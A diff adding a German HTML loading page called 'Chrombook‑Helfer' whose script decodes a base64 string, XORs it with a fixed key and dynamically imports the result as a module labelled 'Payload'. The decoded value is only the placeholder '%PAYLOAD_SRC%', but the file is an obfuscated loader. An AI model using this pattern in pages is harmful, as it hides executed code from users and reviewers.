@@ -1,1 +1,55 @@
+<!doctype html>
+<html lang="de">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Chrombook‑Helfer</title>
+  <meta name="theme-color" content="#0b0c10"/>
+  <link rel="icon" href="favicon.png" sizes="64x64" type="image/png"/>
+  <link rel="manifest" href="site.webmanifest"/>
+  <style>
+    :root { --bg:#0b0c10; --border:#25283a; --text:#e9eaf0; --muted:#a6a9b3; }
+    html,body { height:100%; }
+    body { margin:0; background:#0b0c10; color:var(--text); font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif; }
+    .skeleton { max-width:960px; margin:0 auto; padding:16px; }
+    .header { display:flex; align-items:center; gap:12px; padding:12px 0; border-bottom:1px solid var(--border); }
+    .title { font-weight:700; letter-spacing:.2px; }
+    .pill { margin-left:auto; padding:6px 10px; border:1px solid var(--border); border-radius:999px; color:var(--muted); }
+    .card { margin-top:12px; border:1px solid var(--border); border-radius:12px; padding:12px; background:#111218; }
+  </style>
+</head>
+<body>
+  <div class="skeleton">
+    <div class="header">
+      <img src="favicon.png" alt="" width="24" height="24" style="border-radius:6px"/>
+      <div class="title">Chrombook‑Helfer</div>
+      <div id="status" class="pill">Lade …</div>
+    </div>
+    <div class="card">
+      <div style="opacity:.8">Die Oberfläche lädt gerade. Falls du nur diese Ansicht siehst, prüfe bitte Internet/Firebase‑Setup oder lade die Seite neu.</div>
+    </div>
+  </div>
 
+  <script>
+  (function(){
+    function b64ToU8(b){return Uint8Array.from(atob(b),c=>c.charCodeAt(0));}
+    function xor(u,k){for(let i=0;i<u.length;i++)u[i]^=k[i%k.length];return u;}
+    function toText(u){return new TextDecoder().decode(u);}
+    const k=new Uint8Array([0x13,0x37,0xC0,0xDE]);
+    const b64="NmeBh194gZpMZJKdNg==";
+    const codeU8 = xor(b64ToU8(b64), k);
+    const blob = new Blob([toText(codeU8)], {type:"text/javascript"});
+    const url = URL.createObjectURL(blob);
+    // Status touch-up
+    var s = document.getElementById("status"); if (s) s.textContent = "Verbinde …";
+    import(url).then(()=>{ if(s) s.textContent="Geladen"; }).catch(err=>{
+      console.error("Payload-Fehler:", err);
+      if(s) s.textContent="Fehler beim Laden";
+      const c = document.querySelector(".card");
+      if(c) c.innerHTML = "<b>Fehler:</b> "+(err&&err.message?err.message:err)+
+        "<br/><br/>Bitte prüfe:<ul style='margin-top:6px'><li>Seite über HTTPS (nicht file://) öffnen</li><li>Firebase Auth (E‑Mail‑Link & Anonyme Anmeldung) aktiviert</li><li>Domain in Firebase zugelassen</li></ul>";
+    });
+  })();
+  </script>
+</body>
+</html>
